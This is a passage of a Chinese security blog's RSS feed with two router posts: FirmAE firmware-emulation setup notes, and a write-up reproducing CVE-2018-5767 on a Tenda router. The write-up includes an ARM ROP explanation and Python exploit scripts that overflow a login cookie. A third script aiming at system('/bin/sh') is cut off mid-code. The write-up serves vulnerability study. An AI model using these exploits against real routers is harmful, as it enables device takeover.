<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>唐仔橙 • Posts by &#34;路由器&#34; tag</title>
        <link>https://tangzichengcc.github.io</link>
        <description>喜欢探索世界,在读研究生,计算机爱好者的成长记录</description>
        <language>zh-CN</language>
        <pubDate>Sat, 03 Jun 2023 20:09:40 +0800</pubDate>
        <lastBuildDate>Sat, 03 Jun 2023 20:09:40 +0800</lastBuildDate>
        <category>路由器</category>
        <category>旅游</category>
        <category>浏览器安全</category>
        <category>csapp</category>
        <category>C语言</category>
        <category>PWN入门</category>
        <category>堆</category>
        <category>docker</category>
        <category>脚本</category>
        <category>研究生课程</category>
        <category>诗歌</category>
        <category>调试</category>
        <category>论文</category>
        <category>KVM</category>
        <category>USENIX</category>
        <item>
            <guid isPermalink="true">https://tangzichengcc.github.io/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/</guid>
            <title>固件模拟工具firmae安装</title>
            <link>https://tangzichengcc.github.io/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/</link>
            <category>路由器</category>
            <pubDate>Sat, 03 Jun 2023 20:09:40 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;​		因为最近在做iot相关的漏洞复现,搭建环境是很重要的一环,qemu可以直接搭建,但有时候一些细节会导致一些问题,所以firmae是一个集成化的工具,可以帮助一键搭建环境.&lt;/p&gt;
&lt;p&gt;​		但是安装这个工具的时候..又发生了奇奇怪怪的问题…记录一下.. 搞计算机遇到报错太正常了,但同样也是非常搞人心态的,学会如何排错,如何利用搜索引擎(包含chatgpt!)来解决问题是很重要的一个能力!&lt;/p&gt;
&lt;p&gt;​		有一说一,能真机还是最好别虚拟… 当然没有那么多钱、也不一定能买到,虚拟也是不错的&lt;/p&gt;
&lt;p&gt;工具地址:&lt;a href=&#34;https://github.com/pr0v3rbs/FirmAE&#34;&gt;https://github.com/pr0v3rbs/FirmAE&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;搭建环境:ubuntu18&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git clone --recursive https://github.com/pr0v3rbs/FirmAE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./download.sh               # 就是一个下载脚本,单纯的download..(国内服务器买香港的,或者用国外的..或者...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./install.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		然后报错了…一堆红…&lt;/p&gt;
&lt;p&gt;​		其实如果不确定是哪里报错了,可以拆看sh脚本,一点一点执行,看看&lt;/p&gt;
&lt;p&gt;​		报错:&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./psycopg/psycopg.h:&lt;span class=&#34;number&#34;&gt;35&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;: fatal error: Python.h: No such file or directory&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Python.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ^~~~~~~~~~&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  compilation terminated.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;解决方案:&lt;a href=&#34;https://stackoverflow.com/questions/19843945/psycopg-python-h-no-such-file-or-directory&#34;&gt;https://stackoverflow.com/questions/19843945/psycopg-python-h-no-such-file-or-directory&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		其实不解决貌似后面也能搭建起来,好像是一路畅通,但运行起来还是显示不了页面等,肯定有问题,所以还是要解决的.&lt;/p&gt;
&lt;figure class=&#34;highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get install python3-dev&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		运行完后重新跑一遍install脚本,出现这个,一路输入y&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Reversed (or previously applied) patch detected!  Assume -R? [n]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		开始模拟&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./init.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https:&lt;span class=&#34;comment&#34;&gt;//github.com/pr0v3rbs/FirmAE/releases/download/v1.0/DIR-868L_fw_revB_2-05b02_eu_multi_20161117.zip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-9&lt;/span&gt;-ubuntu:/home/ubuntu/FirmAE# ./run.sh -r tenda DIR868L_B1_FW205WWb02.bin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] DIR868L_B1_FW205WWb02.bin emulation start!!!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Traceback (most recent call last):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;./sources/extractor/extractor.py&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;, in &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    import binwalk&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ModuleNotFoundError: No module named &lt;span class=&#34;string&#34;&gt;&amp;#x27;binwalk&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		不能直接pip3 install binwalk! 也不能apt install binwalk!!!!&lt;/p&gt;
&lt;p&gt;​		参考:&lt;a href=&#34;https://www.secpulse.com/archives/201139.html&#34;&gt;https://www.secpulse.com/archives/201139.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		可以观察到它目录下有binwalk这个目录,cd进去后 python3 setup.py install&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/image-20230603202938128.png&#34; alt=&#34;image-20230603202938128&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		&lt;font color=&#34;red&#34;&gt;解压固件要用这个命令 (github上也没说啊!!!!)&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;binwalk -Me xxxx.bin --run-as=root&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		然后再run就可以了(有时候环境比较复杂,不知道哪个开的有影响,采用&lt;font color=&#34;red&#34;&gt;重启大法!&lt;/font&gt; 重启后init,然后run)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/image-20230603210311207.png&#34; alt=&#34;image-20230603210311207&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		由于模拟环境是在云服务器上上的内网网卡,公网无法直接访问,需要做个端口转发,&lt;/p&gt;
&lt;p&gt;​		gost:&lt;a href=&#34;https://github.com/ginuerzh/gost&#34;&gt;https://github.com/ginuerzh/gost&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		gzip -d 解压&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gost -L=tcp://:2222/192.168.0.2:80&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		然后就可以访问了!!!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/image-20230603210402320.png&#34; alt=&#34;image-20230603210402320&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://tangzichengcc.github.io/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/</guid>
            <title>CVE-2018-5767漏洞复现的关键问题</title>
            <link>https://tangzichengcc.github.io/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/</link>
            <category>路由器</category>
            <pubDate>Thu, 25 May 2023 09:29:15 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;和恒哥进行的复现&lt;/p&gt;
&lt;h1 id=&#34;arm架构的rop&#34;&gt;&lt;a href=&#34;#arm架构的rop&#34; class=&#34;headerlink&#34; title=&#34;arm架构的rop&#34;&gt;&lt;/a&gt;arm架构的rop&lt;/h1&gt;&lt;p&gt;​		和x86的架构的区别还是挺大的,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/image-20230525095117672.png&#34; alt=&#34;image-20230525095117672&#34;&gt;&lt;/p&gt;
&lt;p&gt;1.pop {r4,r5,r6,fp,pc}会弹出5个值, 3个aaaa给前三个,然后r12-3给fp, wait+24,也就是pop {r3,pc}给pc&lt;/p&gt;
&lt;p&gt;2.执行pop {r3,pc}, 把puts传给  r3, 然后 mov r0,sp;blx r3给pc,&lt;/p&gt;
&lt;p&gt;3.mov r0,sp好像没啥用, blx r3跳转指令,它用于将程序控制权转移到寄存器 R3 中存储的地址处。BLX指令可以用于跳转到一个函数或者子程序的地址。 &lt;font color=&#34;red&#34;&gt;所以就跳到了puts了!&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/image-20230525095714223.png&#34; alt=&#34;image-20230525095714223&#34;&gt;&lt;/p&gt;
&lt;p&gt;栈传参数,此时栈顶是要puts的字符串,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/image-20230525095421987.png&#34; alt=&#34;image-20230525095421987&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/image-20230525095441303.png&#34; alt=&#34;image-20230525095441303&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;python2版本exp&#34;&gt;&lt;a href=&#34;#python2版本exp&#34; class=&#34;headerlink&#34; title=&#34;python2版本exp&#34;&gt;&lt;/a&gt;python2版本exp&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base = &lt;span class=&#34;number&#34;&gt;0xff60acd4&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x035CD4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc.so.0&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts = base+libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;xxxxxx\x00&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r0 = base+&lt;span class=&#34;number&#34;&gt;0x00040cb8&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;# mov r0, sp; blx r3;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_r3 = base+&lt;span class=&#34;number&#34;&gt;0x00018298&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;# pop &amp;#123;r3, pc&amp;#125;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;URL = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://xxxxxx:80/goform/hello&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl = &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;444&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;quot;.png&amp;quot;&lt;/span&gt;+p32(pop_r3)+p32(puts)+p32(mov_r0)+_&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cookie = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;Cookie&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;password=&amp;quot;&lt;/span&gt;+pl&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;requests.get(url=URL, cookies=cookie)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;python3版本exp&#34;&gt;&lt;a href=&#34;#python3版本exp&#34; class=&#34;headerlink&#34; title=&#34;python3版本exp&#34;&gt;&lt;/a&gt;python3版本exp&lt;/h2&gt;&lt;p&gt;​		python3和python2的转换一直出奇奇怪怪的问题,是编码的问题,如何过渡好呢?&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/yongbaoii/article/details/108873780&#34;&gt;https://blog.csdn.net/yongbaoii/article/details/108873780&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base = &lt;span class=&#34;number&#34;&gt;0xff60acd4&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x035CD4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc.so.0&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts = base+libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;xxxxxx\x00&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r0 = base+&lt;span class=&#34;number&#34;&gt;0x00040cb8&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;# mov r0, sp; blx r3;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_r3 = base+&lt;span class=&#34;number&#34;&gt;0x00018298&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;# pop &amp;#123;r3, pc&amp;#125;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;URL = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://xxxxxx:80/goform/hello&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl = &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;444&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;quot;.png&amp;quot;&lt;/span&gt;+p32(pop_r3).decode(&lt;span class=&#34;string&#34;&gt;&amp;quot;iso-8859-1&amp;quot;&lt;/span&gt;) +p32(puts).decode(&lt;span class=&#34;string&#34;&gt;&amp;quot;iso-8859-1&amp;quot;&lt;/span&gt;) +p32(mov_r0).decode(&lt;span class=&#34;string&#34;&gt;&amp;quot;iso-8859-1&amp;quot;&lt;/span&gt;)+_&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cookie = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;Cookie&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;password=&amp;quot;&lt;/span&gt;+pl&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;requests.get(url=URL, cookies=cookie)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;decode(“iso-8859-1”)  就可以了!&lt;/p&gt;
&lt;h1 id=&#34;system-“-x2F-bin-x2F-sh”&#34;&gt;&lt;a href=&#34;#system-“-x2F-bin-x2F-sh”&#34; class=&#34;headerlink&#34; title=&#34;system(“&amp;#x2F;bin&amp;#x2F;sh”)&#34;&gt;&lt;/a&gt;system(“&amp;#x2F;bin&amp;#x2F;sh”)&lt;/h1&gt;&lt;p&gt;​		看博主一直复现失败,打算试试qemu-system模式的..但是在自己服务器上就复现成功了…很玄学(计算机没有玄学!)&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base = &lt;span class=&#34;number&#34;&gt;0xff60acd4&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x035CD4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc.so.0&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts = base+libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr = base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r0 = base+&lt;span class=&#34;number&#34;&gt;0x00040cb8&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;# mov r0, sp; blx r3;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_r3 = base+&lt;span class=&#34;number&#34;&gt;0x00018298&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;# pop &amp;#123;r3, pc&amp;#125;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;URL = &lt;span 